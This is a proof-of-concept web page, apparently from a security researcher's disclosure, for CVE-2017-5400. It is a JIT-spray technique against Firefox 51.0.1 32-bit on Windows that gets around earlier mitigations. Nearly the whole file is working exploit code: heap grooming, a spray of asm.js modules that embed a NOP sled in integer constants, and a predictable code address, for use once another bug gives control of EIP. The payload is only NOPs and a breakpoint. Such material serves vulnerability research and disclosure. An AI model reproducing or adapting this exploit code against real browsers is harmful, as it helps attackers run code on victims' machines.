<!DOCTYPE HTML>
<meta charset=UTF-8 />
<!--

    BUG 1334933 (CVE-2017-5400)

    Targeted (but unprecise) ASM.JS JIT-Spray (CVE-2017-5400)
    (Circumvention of the mitigations introduced against bug 1325200)

    Tested against:

    *) Firefox Release 51.0.1 32-bit
       https://ftp.mozilla.org/pub/firefox/releases/51.0.1/win32/en-US/Firefox%20Setup%2051.0.1.exe

    running on Windows 10 64-bit (Version 1511)

    PoC contains only NOP sled. See Bug 1325200 for more information.

    Howto:
    1) serve PoC over network and open it in Firefox 51.0.1
    2) set EIP to 0x55550055 (Firefox 51.0.1) in Debugger
    3) Continue execution. This should trigger the breakpoint at the end of the
       nop sled


    Writeup: https://rh0dev.github.io/blog/2017/the-return-of-the-jit-part-2/

    (C) Rh0 - Jul. 17, 2017


    Notes:
    ======

    Original instructions:
    5555004e c7442408909090a9 mov     dword ptr [esp+8],0A9909090h
    55550056 c744240c909090a9 mov     dword ptr [esp+0Ch],0A9909090h
    5555005e c7442410909090a9 mov     dword ptr [esp+10h],0A9909090h

    become:

    *) Release 51.0.1:
    55550053 90              nop
    55550054 90              nop
    55550055 a9c744240c      test    eax,0C2444C7h
    5555005a 90              nop
    5555005b 90              nop
    5555005c 90              nop
    5555005d a9c7442410      test    eax,102444C7h
    55550062 90              nop

    =======

-->


<script>
function asm_js_module(stdlib, ffi, heap){
    'use asm';
    var ffi_func = ffi.func
    function payload_code(){
        /* nop sled */
        var val = 0;
        val = ffi_func(
            0xa9909090|0,
            // c74424**909090a9 mov dword ptr [esp + 0x**], 0x0A9909090
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            0xa9909090|0,
            // c744247c9090eb07 mov dword ptr [esp+7Ch],7EB9090h
            0x07eb9090|0,
            // c78424800000009090eb07 mov dword ptr [esp+80h],7EB9090h
            // jump!
            0x07eb9090|0,
            // jump!
            0x07eb9090|0,
            // jump!
            0x07eb9090|0,
            // break!
            0x909090cc|0)|0; // int3, nop; nop; nop;
            return val|0;
    }
    return payload_code;

}

/* used to pass many parameters in asm.js module */
function ffi(){ // foreignFunctionInterface
    var x = 0;
    return x|0;
}


/* should trigger garbage collection */
function gc(){
    for (var i=0; i<=10; i++)
        var x = new ArrayBuffer(0x1000000)
}


function main(){
    var heap = []
    var current_address = 0x08000000
    var end_address = 0x50000000
    var block_size = 0x1000000

    /* reserve large heap blocks to decrease possible 64KB addresses
       this only serves the purpose to get more deterministic VirtualAlloc
       allocations with asm.js modules later on */
    while(current_address < end_address){
        var heap_block = new Uint32Array(block_size/4 - 0x100)
        heap.push(heap_block)
        current_address += block_size
    }

    buffer = new ArrayBuffer(1 << 16)
    x = []

    /* this works only once for a process!
       spray max wasm allocations allowed, assuming that each module will be
       smaller than 64KB
     */
    for (var i=0;i<(159*1024*1024)/(64*1024);i++){ 
        x[i] = asm_js_module(window, {func: ffi}, buffer)
    }

    /* release large heap blocks */
    heap = ""
    gc()
        
    trigger_vuln()
}


/* GET EIP CONTROL WITH YOUR VULN HERE */
/* SET EIP TO 0x55550055 ON WINDOWS 32-bit*/
function trigger_vuln(){
    /* You may need to adjust this address dependent on your vuln */
    jit_target_51_0_1 = 0x55550055
    msg = "Set EIP with your vulnerability (or with a debugger) to address "
    msg += '0x' + jit_target_51_0_1.toString(16) + " (Firefox 51.0.1)"
    alert(msg)
}



</script>
<body style=background:black onload=main()>
<h2 style=color:green>
&#x03C1;
</h2>
</body>

